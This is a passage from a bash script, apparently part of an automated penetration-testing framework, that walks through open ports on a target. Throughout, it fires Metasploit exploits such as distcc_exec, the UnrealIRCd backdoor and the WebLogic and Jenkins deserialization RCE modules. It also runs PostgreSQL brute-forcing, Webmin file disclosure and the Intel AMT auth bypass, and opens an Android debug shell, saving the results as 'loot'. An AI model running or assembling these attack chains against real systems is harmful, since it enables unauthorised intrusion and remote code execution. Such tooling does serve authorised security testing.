  echo -e "${OKGREEN}====================================================================================${RESET}"
  rdesktop $TARGET &
fi

if [ -z "$port_3632" ];
then
  echo -e "$OKRED + -- --=[Port 3632 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 3632 opened... running tests...$RESET"
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -sV -Pn -T5 --script=distcc-* -p 3632 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port3632.txt
  fi
  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use unix/misc/distcc_exec; run; exit;"| tee $LOOT_DIR/output/msf-$TARGET-port3632-distcc_exec.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port3632-distcc_exec.raw > $LOOT_DIR/output/msf-$TARGET-port3632-distcc_exec.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port3632-distcc_exec.raw 2> /dev/null
  fi
fi

if [ -z "$port_5432" ];
then
  echo -e "$OKRED + -- --=[Port 5432 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 5432 opened... running tests...$RESET"
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -sV -Pn --script=pgsql-brute -p 5432 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port5432.txt
  fi
  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use auxiliary/scanner/postgres/postgres_login; setg RHOSTS "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port5432-postgres_login.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port5432-postgres_login.raw > $LOOT_DIR/output/msf-$TARGET-port5432-postgres_login.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port5432-postgres_login.raw 2> /dev/null
  fi
fi

if [ -z "$port_5555" ];
then
  echo -e "$OKRED + -- --=[Port 5555 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 5555 opened... running tests...$RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED CONNECTING TO ANDROID DEBUG SHELL $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  adb connect $TARGET:5555
  adb shell pm list packages 
fi

if [ -z "$port_5800" ];
then
  echo -e "$OKRED + -- --=[Port 5800 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 5800 opened... running tests...$RESET"
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -sV -Pn -T5 --script=vnc* -p 5800 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port5800.txt
  fi
fi

if [ -z "$port_5900" ];
then
  echo -e "$OKRED + -- --=[Port 5900 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 5900 opened... running tests...$RESET"
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -sV  -T5 --script=vnc* -p 5900 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port5900.txt
  fi
  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use auxiliary/scanner/vnc/vnc_none_auth; setg RHOSTS \"$TARGET\"; run; back; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port5900-vnc_none_auth.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port5900-vnc_none_auth.raw > $LOOT_DIR/output/msf-$TARGET-port5900-vnc_none_auth.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port5900-vnc_none_auth.raw 2> /dev/null
  fi
fi

if [ -z "$port_5984" ];
then
  echo -e "$OKRED + -- --=[Port 5984 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 5984 opened... running tests...$RESET"
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -sV -Pn -T5 --script=couchdb* -p 5984 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port5984.txt
  fi
  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use auxiliary/scanner/couchdb/couchdb_enum; set RHOST "$TARGET"; run; exit;"| tee $LOOT_DIR/output/msf-$TARGET-port5984-couchdb_enum.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port5984-couchdb_enum.raw > $LOOT_DIR/output/msf-$TARGET-port5984-couchdb_enum.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port5984-couchdb_enum.raw 2> /dev/null
  fi
fi

if [ -z "$port_6000" ];
then
  echo -e "$OKRED + -- --=[Port 6000 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 6000 opened... running tests...$RESET"
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -sV -Pn -T5 --script=x11* -p 6000 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port6000.txt
  fi
  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use auxiliary/scanner/x11/open_x11; set RHOSTS "$TARGET"; exploit;" | tee $LOOT_DIR/output/msf-$TARGET-port6000-open_x11.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port6000-open_x11.raw > $LOOT_DIR/output/msf-$TARGET-port6000-open_x11.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port6000-open_x11.raw 2> /dev/null
  fi
fi

if [ -z "$port_6667" ];
then
  echo -e "$OKRED + -- --=[Port 6667 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 6667 opened... running tests...$RESET"
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -sV -Pn -T5 --script=irc* -p 6667 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port6667.txt
  fi
  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use unix/irc/unreal_ircd_3281_backdoor; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port6667-unreal_ircd_3281_backdoor.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port6667-unreal_ircd_3281_backdoor.raw > $LOOT_DIR/output/msf-$TARGET-port6667-unreal_ircd_3281_backdoor.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port6667-unreal_ircd_3281_backdoor.raw 2> /dev/null
  fi
fi

if [ -z "$port_7001" ];
then
  echo -e "$OKRED + -- --=[Port 7001 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 7001 opened... running tests...$RESET"
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -sV -p 7001 --script=weblogic-t3-info.nse $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port7001.txt
  fi
  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use multi/http/oracle_weblogic_wsat_deserialization_rce; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; set SSL true; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port7001-oracle_weblogic_wsat_deserialization_rce.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port7001-oracle_weblogic_wsat_deserialization_rce.raw > $LOOT_DIR/output/msf-$TARGET-port7001-oracle_weblogic_wsat_deserialization_rce.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port7001-oracle_weblogic_wsat_deserialization_rce.raw 2> /dev/null
    msfconsole -q -x "use exploit/linux/misc/jenkins_java_deserialize; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT 7001; set SSL true; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port7001-jenkins_java_deserialize.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port7001-jenkins_java_deserialize.raw > $LOOT_DIR/output/msf-$TARGET-port7001-jenkins_java_deserialize.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port7001-jenkins_java_deserialize.raw 2> /dev/null
  fi
fi

if [ -z "$port_10000" ];
then
  echo -e "$OKRED + -- --=[Port 10000 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 10000 opened... running tests...$RESET"
  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING WEBMIN FILE DISCLOSURE EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use auxiliary/admin/webmin/file_disclosure; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port10000-file_disclosure.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port10000-file_disclosure.raw > $LOOT_DIR/output/msf-$TARGET-port10000-file_disclosure.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port10000-file_disclosure.raw 2> /dev/null
  fi
fi

if [ -z "$port_16992" ];
then
  echo -e "$OKRED + -- --=[Port 16992 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 16992 opened... running tests...$RESET"
  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING INTEL AMT AUTH BYPASS EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use auxiliary/scanner/http/intel_amt_digest_bypass; setg RHOSTS \"$TARGET\"; run; back; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port16992-intel_amt_digest_bypass.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port16992-intel_amt_digest_bypass.raw > $LOOT_DIR/output/msf-$TARGET-port16992-intel_amt_digest_bypass.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port16992-intel_amt_digest_bypass.raw 2> /dev/null
  fi
fi

if [ -z "$port_27017" ];
then
  echo -e "$OKRED + -- --=[Port 27017 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 27017 opened... running tests...$RESET"
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -sV -p 27017 -Pn -T5 --script=mongodb* $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port27017.txt
  fi
fi

if [ -z "$port_27018" ];
then
  echo -e "$OKRED + -- --=[Port 27018 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 27018 opened... running tests...$RESET"
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -sV  -p 27018 -Pn -T5 --script=mongodb* $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port27018.txt
  fi
fi

if [ -z "$port_27019" ];
then
  echo -e "$OKRED + -- --=[Port 27019 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 27019 opened... running tests...$RESET"
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -sV  -p 27019 -Pn -T5 --script=mongodb* $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port27019.txt
  fi
fi

if [ -z "$port_28017" ];
then
  echo -e "$OKRED + -- --=[Port 28017 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 28017 opened... running tests...$RESET"
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -sV  -p 28017 -Pn -T5 --script=mongodb* $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port28017.txt
  fi
fi

if [ $YASUO = "1" ]; then
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED SCANNING FOR COMMON VULNERABILITIES $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  if [ ${DISTRO} == "blackarch" ]; then
    /bin/yasuo -r $TARGET -b all | tee $LOOT_DIR/output/yasuo-$TARGET.txt 2> /dev/null
    tee $LOOT_DIR/output/yasuo-$TARGET.raw 2> /dev/null
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/yasuo-$TARGET.raw > $LOOT_DIR/output/yasuo-$TARGET.txt 2> /dev/null
    rm -f $LOOT_DIR/output/yasuo-$TARGET.raw 2> /dev/null
  else
    cd $PLUGINS_DIR/yasuo
    ruby yasuo.rb -r $TARGET -b all | tee $LOOT_DIR/output/yasuo-$TARGET.raw 2> /dev/null
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/yasuo-$TARGET.raw > $LOOT_DIR/output/yasuo-$TARGET.txt 2> /dev/null
    rm -f $LOOT_DIR/output/yasuo-$TARGET.raw 2> /dev/null
  fi
fi

cd $INSTALL_DIR
source modes/fullportscan.sh
source modes/bruteforce.sh

rm -f $LOOT_DIR/.fuse_* 2> /dev/null
sort -u $LOOT_DIR/ips/ips-all-unsorted.txt 2> /dev/null > $LOOT_DIR/ips/ips-all-sorted.txt 2> /dev/null

echo -e "${OKGREEN}====================================================================================${RESET}"
echo -e "$OKRED SCAN COMPLETE! $RESET"
echo -e "${OKGREEN}====================================================================================${RESET}"
echo "$TARGET" >> $LOOT_DIR/scans/updated.txt
if [ "$LOOT" = "1" ] && [ -z "$NOLOOT" ]; then
  loot
fi